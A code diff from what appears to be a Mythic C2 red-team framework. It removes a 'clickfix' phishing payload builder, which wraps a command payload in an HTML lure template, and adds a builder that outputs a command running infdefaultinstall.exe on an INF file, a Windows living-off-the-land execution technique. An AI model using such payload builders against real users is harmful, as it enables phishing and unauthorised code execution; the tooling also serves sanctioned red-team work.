@@ -6,23 +6,31 @@ from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 import json
 import os
-import shutil
-import base64
-import random
 
-class clickfix(PayloadType):
-    name = "clickfix"
-    file_extension = "html"
+
+class cmd_infdefaultinstall_local_inf(PayloadType):
+    name = "cmd_infdefaultinstall_local_inf"
+    file_extension = "cmd"
     author = "@hegusung"
     supported_os = [SupportedOS.Windows]
     wrapper = True
-    wrapped_payloads = ["powershell_to_cmd", "cmd_regsvr32_remote_sct"]
-    note = """Creates a clickfix payload"""
+    note = """Executes infdefaultinstall.exe to a INF file"""
     translation_container = None # "myPythonTranslation"
-    agent_path = pathlib.Path(".") / "phishingkit"
-    agent_icon_path = agent_path / "agent_functions" / "phishing.svg"
+    agent_path = pathlib.Path(".") / "cmd"
+    agent_icon_path = agent_path / "agent_functions" / "cmd.svg"
     agent_code_path = agent_path / "agent_code"
     build_parameters = [
+        BuildParameter(
+            name = "binary",
+            parameter_type=BuildParameterType.String,
+            default_value="infdefaultinstall.exe",
+            description="Rundll32 binary",
+        ),
+        BuildParameter(
+            name = "inf_path",
+            parameter_type=BuildParameterType.String,
+            description="INF path",
+        ),
     ]
 
     build_steps = [
@@ -35,19 +43,12 @@ class clickfix(PayloadType):
         build_msg = ""
 
         try:
-            cmd_payload = self.wrapped_payload.decode()
-            cmd_payload = cmd_payload.replace('"', '\\"')
+            binary = self.get_parameter('binary')
+            inf_path = self.get_parameter('inf_path')
 
-            f = open(os.path.join(self.agent_code_path, "clickfix.html.template"), 'r')
-            clickfix_template = f.read()
-            f.close()
+            payload = "%s %s" % (binary, inf_path)
 
-            clickfix_args = {
-                "payload": cmd_payload,
-            }
-
-
-            resp.payload = clickfix_template.format(**clickfix_args)
+            resp.payload = payload
             resp.build_message = "Successfully built!\n"
 
         except Exception as e:
